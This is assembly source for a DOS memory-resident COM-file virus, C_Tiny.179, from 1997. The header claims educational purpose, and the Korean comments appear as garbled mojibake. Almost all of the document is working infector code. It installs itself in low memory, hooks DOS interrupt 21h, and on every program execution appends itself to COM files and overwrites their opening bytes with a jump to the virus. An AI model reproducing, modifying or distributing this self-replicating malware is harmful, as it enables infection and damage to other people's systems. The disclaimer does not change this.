;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;                                              \\\\\\\  \       \  \
;     C_Tiny.179                              \          \     \   \
;                                             \           \   \    \   98/03
;                                             \            \ \     \
;                                              \\\\\\\      \      \\\\\\\ #03
; Virus Name : C_Tiny.179
; Author     : Osiris
; Origin     : Corea
; Date       : 1997/12/07
;
; Type : Memory resident  COM
;
; !****************************************************************************!
; *                                                                            *
; * ‰w‰¡ !                                                                     *
; *    ·¡ˆõ·e ¤a·¡œá¯a ­¡¯a Å¡—a·¡”a. Ša·B¸â·¥ ¡¢¸â·a¡ e ¬a¶w–A´á´¡Ðe”a.      *
; *    ¹A¸b¸a“e ·¡ ­¡¯aÅ¡—a¡ ´¡‹¡–A“e ´á˜áÐe ¢…¹AµA ”Ð¬á•¡ À‚·±·i »¡»¡ ´g   *
; *    “e”a. ¥eÑw Ðaˆáa ¯©Ð—Ða»¡  iœa !                                       *
; *                                                                            *
; * Warning !                                                                  *
; *    This is a VIRUS source code. This source code is provieded educational  *
; *    purpose. The author is not responsible for any damage caused by this c  *
; *    ode. Don't modify or execute it !                                       *
; *                                                                            *
; !****************************************************************************!
;
; ˆe”eÐe œ‘¬wº ¤a·¡œá¯a¡ ·¥ÈáœóËa ¥BÈá º­¡ÎaµA ¬wºÐe”a. (0020:0000)
; ¤a·¡œá¯a ¬wº¸å ·¡ µwµbµA •A·¡Èáˆa ¸åÑa ´ô´á´¡ Ða”a.  e´¢ ·¡µwµbµA 0 ·¡ ´a“¥
; ”aŸe ˆt·¡ ¸á¸w–A´á ·¶”a¡e ¤a·¡œá¯a“e ‹¡´â¸w­¡µA ¬wº Ða»¡ ´g“e”a.
; ‹aŸ¡‰¡, COM Ìa·© e ˆqµq¯¡Ç¡¡a ˆqµq µa¦“e Ìa·©· Àõ ¦¦…·¡ 'M' ·¥»¡ §¡Ša Ðe”a
;
; Ðw¬w Àõ ¤á¸å·e ÉA¯aËa ¤á¸å·¡”a. »¥”e·i Ï¡Ða‹¡ ¶áÐe ´á˜å ‹¡Ša•¡ ¬a¶wÐa»¡ ´g´v
; ”a.
;
; ·¥ÈáœóËa ¥BÈá ÉA·¡§iµA ¬wº Ða“e ¤a·¡œá¯a“e Ça‹¡ˆa ´aº ¸b´a´¡ Ðe”a.
;
; ¥¥‰b¸â·¥ œ‘¬wº ¤a·¡œá¯a ¹A¸bµA ´|¬á ¹AÐe¸â·¥ œ‘¬wº¤w¤ó·¥ ·¥ÈáœóËa¥BÈá ÉA·¡
; §iµA ¬wº Ða“e ¤a·¡œá¯a·¡”a.
;
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

            .MODEL  TINY
            .CODE
            .286

 C_Tiny:
            DB    0E8h,00,00            ;
            pop   si                    ; ¤a·¡œá¯a ¯¡¸b¸ñ ŠÐa‹¡
            sub   si,0003               ; SI = ¤a·¡œá¯a ¯¡¸b¸ñ

            push  si                    ; ¸á¸w
            xor   di,DI                 ;
            mov   ds,DI
            mov   cx, offset End_Virus  ; ¤a·¡œá¯a ‹©·¡  eÇq §¡Ša

 Check_IVT_Zero:
            cmp   byte ptr [DI+200h],0  ; ·¥ÈáœóËa º­¡Îaˆa 0 ·¥»¡ §¡ŠaÐe”a.
            jnz   Restore_COM_Head      ;  e´¢ ´á˜å ˆt·¡ œa•¡ 0 ·¡ ´a“¥ ‰w¶“e
            inc   DI                    ; ‹¡´â¸w­¡µA ¬wº Ða»¡ ´g“e”a
            loop  Check_IVT_Zero        ;

 Copy_Vir_IVT:
            mov   ax,0020h              ;
            mov   es,ax                 ;
            mov   cx, offset End_Virus  ; ¤a·¡œá¯a ‹©·¡
            xor   di,di                 ; ¥¢¬a Ði ‰µ (0020:0000h)
            db    2Eh                   ; CS:SI -> ES:DI
            repz  movsb                 ; ¥¢¬a !

            mov   si, 0084h             ; Int 21h º­¡ˆt ´è‹¡
            mov   di, offset Jmp_Org_Int21 + 1
            push  si
            movsw
            movsw

            pop   si                    ;
            cli                         ; Int 21h ˆa¡À‹¡
            mov   word ptr [SI], offset NewInt21
            mov   word ptr [SI+2], 0020h
            sti

 Restore_COM_Head:
            push  cs                    ; cs=ds=es
            pop   ds
            push  cs
            pop   es
            pop   si                    ; SI ¥¢Š
            add   si, offset OldCOMHead ; COM ´|¦¦… º­¡ ‰¬e
            mov   di,100h               ; COM ´|¦¦… ¥¢Š
            push  di                    ;
            movsw                       ; 4 ¤a·¡Ëa ¥¢Š
            movsw                       ;
            ret                         ;

 OldCOMHead db    90h,90h,0CDh,20h      ; ¶¥œ COM ´|¦¦…
            db   'C_Tiny'               ; ¤a·¡œá¯a ·¡Ÿq

 NewInt21:
            cmp   ah,4bh                ; ¯©Ð—·¥ˆa ?
            jnz   Jmp_Org_Int21

            pusha                       ; 286 + µA¬á »¡¶¥
            push  ds
            push  es

            mov   ax, 3D02h             ; Ìa·© µ¡Ïe
            int   21h
            jc    Error

            xchg  ax,bx                 ; Ð…—i ´è‹¡

            push  cs                    ; ­A‹a åËa É··©
            pop   ds
            push  cs
            pop   es

            mov   ah, 3fh               ; Ìa·© ·ª‹¡
            mov   cx, 4                 ; ¤a·¡Ëa®
            mov   dx, offset OldCOMHead ; º­¡ˆt
            int   21h

            cmp   byte ptr OldCOMHead, 'M' ; ˆqµq–A´öa / EXE Ìa·©·¥ˆa ?
            jz    Close

            mov   ax,4202h              ; Ìa·© {·a¡ ·¡•·
            xor   cx,cx
            xor   dx,dx
            int   21h

            mov   word ptr Jump_Code, 0E94Dh

            sub   ax,0004               ; ¸ñÏaˆt ‰¬e
            mov   word ptr Jump_Code + 2, ax

            mov   ah, 40h               ; ¤a·¡œá¯a ³a‹¡
            mov   cx, offset End_Virus
            xor   dx,dx
            int   21h

            mov   ax,4200h              ; Ìa·© Àá·q·a¡ ·¡•·
            xor   cx,cx
            xor   dx,dx
            int   21h

            mov   ah, 40h               ; ´|¦¦… ³a‹¡
            mov   cx, 4
            mov   dx, offset Jump_Code
            int   21h

 Close:
            mov   ah,3Eh                ; Ìa·© ”h‹¡
            int   21h
 Error:
            pop   es
            pop   ds
            popa
 Jmp_Org_Int21:
            db    0EAh                  ;
 End_Virus:
            dw    ?,?                   ;

 Jump_Code  dw    ?                     ; M, E9h
            db    ?,?                   ; ¸ñÏa ˆt

 End_Memory:
            END   C_Tiny

